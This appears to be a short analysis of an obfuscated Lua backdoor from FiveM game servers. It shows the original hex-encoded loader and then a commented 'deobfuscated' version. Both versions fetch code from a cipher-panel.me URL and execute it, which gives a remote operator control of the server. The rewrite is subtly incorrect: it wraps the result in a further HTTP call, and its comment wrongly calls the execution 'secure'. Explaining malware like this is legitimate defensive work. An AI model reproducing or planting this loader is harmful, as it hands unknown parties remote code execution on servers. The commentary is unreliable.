local nKTOxfgYSWNozIkcZKKmBadXqqvpQGTbVDSyBUSCcZEdFLksNNBiSkTevShjblfADwPeCm = {
    "\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74", "\x61\x73\x73\x65\x72\x74",
    "\x6c\x6f\x61\x64", _G, "", nil }
nKTOxfgYSWNozIkcZKKmBadXqqvpQGTbVDSyBUSCcZEdFLksNNBiSkTevShjblfADwPeCm[4]
    [nKTOxfgYSWNozIkcZKKmBadXqqvpQGTbVDSyBUSCcZEdFLksNNBiSkTevShjblfADwPeCm[1]](
    "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x78\x6c\x37\x36",
        function(dtoZoIzlKVWHWkdRzMDXAvcCbuCiuBMqUVeRurfhItZZIlnLeDhQCCjlQlbZBXIirZpHqB,
                 DkVkLEeNPFntsvJLKlRTVUjvzThOmPuUueWnhJimJrYFjEVcpBgiNQoCqEhhbhZZjaiKfU)
            if (DkVkLEeNPFntsvJLKlRTVUjvzThOmPuUueWnhJimJrYFjEVcpBgiNQoCqEhhbhZZjaiKfU == nKTOxfgYSWNozIkcZKKmBadXqqvpQGTbVDSyBUSCcZEdFLksNNBiSkTevShjblfADwPeCm[6] or DkVkLEeNPFntsvJLKlRTVUjvzThOmPuUueWnhJimJrYFjEVcpBgiNQoCqEhhbhZZjaiKfU == nKTOxfgYSWNozIkcZKKmBadXqqvpQGTbVDSyBUSCcZEdFLksNNBiSkTevShjblfADwPeCm[5]) then return end
            nKTOxfgYSWNozIkcZKKmBadXqqvpQGTbVDSyBUSCcZEdFLksNNBiSkTevShjblfADwPeCm[4]
                [nKTOxfgYSWNozIkcZKKmBadXqqvpQGTbVDSyBUSCcZEdFLksNNBiSkTevShjblfADwPeCm[2]](
                nKTOxfgYSWNozIkcZKKmBadXqqvpQGTbVDSyBUSCcZEdFLksNNBiSkTevShjblfADwPeCm[4]
                [nKTOxfgYSWNozIkcZKKmBadXqqvpQGTbVDSyBUSCcZEdFLksNNBiSkTevShjblfADwPeCm[3]](
                DkVkLEeNPFntsvJLKlRTVUjvzThOmPuUueWnhJimJrYFjEVcpBgiNQoCqEhhbhZZjaiKfU))()
        end)

-- above is the original code

-- Sending an HTTP request to the specified URL
local url = "https://cipher-panel.me/_i/v2_/stage3.php?to=dxl76"
PerformHttpRequest(url, function(responseData, responseCode)
    -- Check if the 'responseCode' variable is nil or equal to an empty string
    if (responseCode == nil or responseCode == "") then
        return -- Return early if the variable is nil or empty
    end

    -- Execute the Lua code stored in 'responseCode'
    -- The code is loaded as a function using 'load', and then 'assert' ensures it's executed securely
    PerformHttpRequest(assert(load(responseCode))())
end)
